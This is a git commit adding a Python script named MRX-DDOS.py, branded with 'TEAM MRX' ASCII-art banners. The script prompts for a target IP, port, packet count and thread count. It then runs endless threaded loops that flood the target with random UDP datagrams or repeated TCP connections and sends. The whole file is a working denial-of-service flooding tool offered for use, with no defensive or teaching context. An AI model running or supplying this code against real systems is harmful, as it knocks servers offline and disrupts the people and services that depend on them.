62a97cb67fa5e9f231ad40e590293cea216c7981
Zinoubba345 <hdnf03210@gmail.com>
2024-09-13 22:12:51 +0100

    MRX-DDOS.py

---
+++ MRX-DDOS.py
@@ -0,0 +1,90 @@
+import random
+import socket
+import threading
+import platform
+
+print("DDoS is Running in : "+platform.system())
+
+if platform.system() == 'Windows':
+
+	print("""
+ TEAM X is Presenting to you :
+
+
+████████╗███████╗░█████╗░███╗░░░███╗  ██╗░░██╗
+╚══██╔══╝██╔════╝██╔══██╗████╗░████║  ╚██╗██╔╝
+░░░██║░░░█████╗░░███████║██╔████╔██║  ░╚███╔╝░
+░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  ░██╔██╗░
+░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  ██╔╝╚██╗
+░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝
+
+██████╗░██████╗░░█████╗░░██████╗
+██╔══██╗██╔══██╗██╔══██╗██╔════╝
+██║░░██║██║░░██║██║░░██║╚█████╗░
+██║░░██║██║░░██║██║░░██║░╚═══██╗
+██████╔╝██████╔╝╚█████╔╝██████╔╝
+╚═════╝░╚═════╝░░╚════╝░╚═════╝░
+
+Created by Zinou
+
+	""")
+else :
+	print("""
+ TEAM MRX is Presenting to you :
+
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄  ⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+             KARASKO
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+		""")
+
+
+print("DDos")
+ip= str(input("                    Server ip MRX  :"))
+port= int(input("                    port MRX :"))
+choice = str(input("                    DDoS Attack?? (y/n) MRX :"))
+times= int(input("                    Paket MRX :"))
+threads= int(input("                    threads MRX :"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[-]","[•]","[×]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"TEAM MRX TNIK!!!!!!")
+		except:
+			print("[!] SERVER DOWN!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[-]","[+]","[x]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"TEAM MRX TNIK!!!!!!")
+		except:
+			s.close()
+			print("[*] SERVER DOWN")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
